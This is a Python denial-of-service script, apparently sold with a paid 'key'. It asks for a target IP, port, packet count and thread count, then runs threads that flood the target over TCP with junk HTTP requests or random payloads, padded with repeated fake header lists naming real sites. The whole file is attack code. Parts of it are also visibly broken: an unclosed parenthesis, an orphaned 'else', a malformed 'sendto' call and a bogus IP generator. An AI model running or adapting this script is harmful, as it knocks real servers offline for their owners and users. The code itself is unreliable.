import threading
import os, sys
import time
import socket, requests 
import random
userip = ["""45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443"""]
acceptall = [""" https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com """]
all = [""" https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/ """]
socks5= [""" 192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/
192.186.28.1:443 https://google.com/ https://duck.id.com/ """]
useragents=["""Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"""]

print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
              |  LAYER4  |  TIME:LIFETIME |
              |  LAYER7  |   TCP:443/80   |
              |   TCP    |      UDP:17091    |
              |   UDP    |
              """)
def kok():
 print("Buy Key? chat:085871151230")
 mopon = str(input("code >= "))
 if mopon == "lifetime20":
    unlock = 2
 else:
    unlock = 1
 if unlock == 1:
    print("ORDER DEK")
 if unlock == 2:
    print("VĪP DÉTÉÇT")
kok()
ip = str(input("IP ATTACK>="))
ip = socket.gethostbyname(ip)
port = int(input("PORT >= "))
choice = str(input("CHOICE (x)(k): ")
pack = int(input("[ ? ] how long do you want Packet/s >="))
th = int(input("[ ? ] how long do you want Thread/t >="))
def randomip():
  randip = [192, 168, 0, 1]
  randip1 = random.randint(3,255)
  randip2 = random.randint(3,255)
  randip3 = random.randint(3,255)
  randip4 = random.randint(3,255)
  randip5 = random.randint(3,255)
 
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
  return(randip)

def start():
  global userip, acceptall, all, useragents, socks5
  time.sleep(0.01)
  hh = random._urandom(999999)
  xx = int(0)
  nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
  sockall = random.choice(socks5)+random.choice(all)+random.choice(useragents)+random.choice(userip)+random.choice(acceptall)+"\r\n"
  lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
  agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
  cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
  ipser = "IP: "+random.choice(userip)+"\r\n"
  accept = random.choice(acceptall)+"\r\n"
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_req = ipser + cekall + sockall + lolall + nolakall + agentall + content + length + accept + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("SÉRVÉR {1} CRÂSH BY ZÁN")
        except:
            s.close()
            print('[+] server error')
def stack():
 data = random._urandom(5000)
 i = random.choice(("[*]","[!]","[#]"))
 while True:
       try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip,port))
         s.sendto(data)
         for y in range(pack):
          s.sendto(data)
          print("SÉRVÉR {1} CRÂSH BY ZÁN")
       except:
          print("[+] server error")
         
 for x in range(th):
  thred = threading.Thread(target=start)
  thred.start()
else: 
 for x in range(th):
  thred = threading.Thread(target=stack)
  thred.start()
  
